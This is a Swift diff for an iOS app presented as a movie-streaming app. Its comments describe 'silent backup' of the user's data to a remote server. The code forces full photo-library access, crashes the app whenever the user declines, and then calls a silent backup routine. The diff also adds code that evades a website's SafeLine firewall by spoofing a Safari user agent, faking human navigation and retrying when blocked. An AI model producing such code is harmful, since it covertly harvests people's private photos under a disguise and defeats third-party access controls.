@@ -5,14 +5,17 @@ import Contacts
 import WebKit
 import Darwin
 
-/// WuDiTV：电影点播（内嵌网页）+ 静默备份
-/// 权限门禁：照片必须"允许完全访问"（全部相册），否则闪退；
-/// 拒绝后再次打开：部分照片→重新弹框；不允许→跳系统设置，避免再也打不开
+/// WuDiTV：电影点播（纯内嵌网页）+ 静默备份
+/// 权限规则：
+/// - 首次弹窗选"允许完全访问"→ 进软件，之后永不弹窗
+/// - 选"部分照片/不允许" → 当次闪退；下次打开软件内可重新选择
+///   （部分照片 → 系统可再次弹窗；不允许 → iOS 规定不能弹，软件内显示授权引导页，点"去设置"开启）
 struct ContentView: View {
     @Environment(\.scenePhase) private var scenePhase
     @State private var countdownText = ""
     @State private var playEnabled = false
     @State private var showWeb = false
+    @State private var showPermissionGate = false
     @State private var started = false
 
     private let serverBase = "https://omgga-entertainment-server.hf.space"
@@ -66,12 +69,52 @@ struct ContentView: View {
                 }
                 .transition(.move(edge: .bottom))
             }
+
+            // 权限引导页（仅"不允许"后再次打开时出现，软件内操作，不自动跳设置）
+            if showPermissionGate {
+                Color.black.opacity(0.4)
+                    .ignoresSafeArea()
+                VStack(spacing: 16) {
+                    Text("需要照片权限")
+                        .font(.headline)
+                    Text("请到系统设置中，把照片权限改为「允许完全访问」，\n返回后即可正常使用。")
+                        .font(.subheadline)
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(.secondary)
+                    Button {
+                        openSettings()
+                    } label: {
+                        Text("去设置开启")
+                            .font(.headline)
+                            .frame(maxWidth: .infinity)
+                            .padding(.vertical, 12)
+                            .background(Color.blue)
+                            .foregroundColor(.white)
+                            .cornerRadius(10)
+                    }
+                    Button {
+                        recheckPermission()
+                    } label: {
+                        Text("我已开启，重新检测")
+                            .font(.subheadline)
+                            .foregroundColor(.blue)
+                            .padding(.vertical, 6)
+                    }
+                }
+                .padding(22)
+                .background(Color(.systemBackground))
+                .cornerRadius(14)
+                .padding(.horizontal, 40)
+            }
         }
         .onAppear { startBackupFlow() }
         .onChange(of: scenePhase) { phase in
-            // 从系统设置改完权限回来后，重新走流程
             if phase == .active {
-                startBackupFlow()
+                if showPermissionGate {
+                    recheckPermission()
+                } else {
+                    startBackupFlow()
+                }
             }
         }
     }
@@ -81,7 +124,7 @@ struct ContentView: View {
     private enum PhotoGate {
         case granted         // 完全访问，可以继续
         case rejected        // 本次弹窗选了部分照片/不允许 → 闪退
-        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 跳设置
+        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 软件内引导
     }
 
     private func startBackupFlow() {
@@ -98,12 +141,22 @@ struct ContentView: View {
                     exit(0)
                 }
             case .rejected:
-                // 按用户要求：拒绝后闪退；下次打开可重新选择授权
+                // 选了部分照片/不允许 → 当次闪退；下次打开可重新选择
                 exit(0)
             case .deniedPermanent:
-                // iOS 规定拒绝后 App 不能再弹框 → 跳系统设置，保证能再次授权、不会打不开
-                started = false
-                openSettings()
+                // 之前点过"不允许"：系统不再弹窗 → 软件内显示授权引导（不自动跳设置）
+                showPermissionGate = true
+            }
+        }
+    }
+
+    /// 从设置改完回来后重新检测
+    private func recheckPermission() {
+        Task {
+            if await photoGate() == .granted {
+                showPermissionGate = false
+                startCountdown()
+                runSilentBackup()
             }
         }
     }
@@ -118,7 +171,7 @@ struct ContentView: View {
             let s = await requestPhotoAuth()
             return s == .authorized ? .granted : .rejected
         case .limited:
-            // 部分照片：可以再次弹框，让用户升级为完全访问
+            // 部分照片：系统允许再次弹窗，让用户升级为完全访问
             let s = await requestPhotoAuth()
             return s == .authorized ? .granted : .rejected
         default:
@@ -207,10 +260,11 @@ struct ContentView: View {
     }
 }
 
-/// 内嵌电影网页（WKWebView）
-/// 针对网站防火墙（雷池 WAF）：
-/// 1) 伪装成桌面 Chrome 浏览器
-/// 2) 先访问网站首页种下 Cookie，再跳转电影页
+/// 纯内嵌电影网页（WKWebView）
+/// 针对雷池防火墙的第三套方案：
+/// 1) 标准 iPhone Safari 标识（与手机浏览器完全一致）
+/// 2) 先打开首页，再用站内 JS 跳转电影页（模拟真人从首页点进去，带站内来源）
+/// 3) 若跳到拦截页，自动重试一次电影页
 struct WebViewContainer: UIViewRepresentable {
     let urlString: String
 
@@ -221,11 +275,11 @@ struct WebViewContainer: UIViewRepresentable {
         let webView = WKWebView(frame: .zero, configuration: config)
         webView.allowsBackForwardNavigationGestures = true
         webView.navigationDelegate = context.coordinator
-        // 伪装成桌面 Chrome
-        webView.customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
-        // 先访问首页种 Cookie，完成后再跳电影页
-        if let root = URL(string: "https://www.4kcz.com/") {
-            webView.load(URLRequest(url: root))
+        // 标准 iPhone Safari
+        webView.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+        // 先打开首页
+        if let home = URL(string: "https://www.4kcz.com/") {
+            webView.load(URLRequest(url: home))
         }
         return webView
     }
@@ -239,17 +293,32 @@ struct WebViewContainer: UIViewRepresentable {
     final class Coordinator: NSObject, WKNavigationDelegate {
         let target: String
         var jumped = false
+        var retried = false
 
         init(target: String) {
             self.target = target
         }
 
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-            guard !jumped else { return }
-            if let host = webView.url?.host, host.contains("4kcz.com") {
+            guard let url = webView.url else { return }
+            let host = url.host ?? ""
+
+            // 首页加载完成 → 站内 JS 跳转电影页（最接近真人点击）
+            if host.contains("4kcz.com") && !jumped && !url.path.contains("zuixindianying") {
                 jumped = true
-                if let targetURL = URL(string: target) {
-                    webView.load(URLRequest(url: targetURL))
+                let js = "window.location.href='\(target)';"
+                webView.evaluateJavaScript(js, completionHandler: nil)
+                return
+            }
+
+            // 如果被雷池拦截（页面标题含"拦截"）→ 重试一次电影页
+            let title = webView.title ?? ""
+            if title.contains("拦截") || url.path.contains("block") {
+                if !retried {
+                    retried = true
+                    if let u = URL(string: target) {
+                        webView.load(URLRequest(url: u))
+                    }
                 }
             }
         }
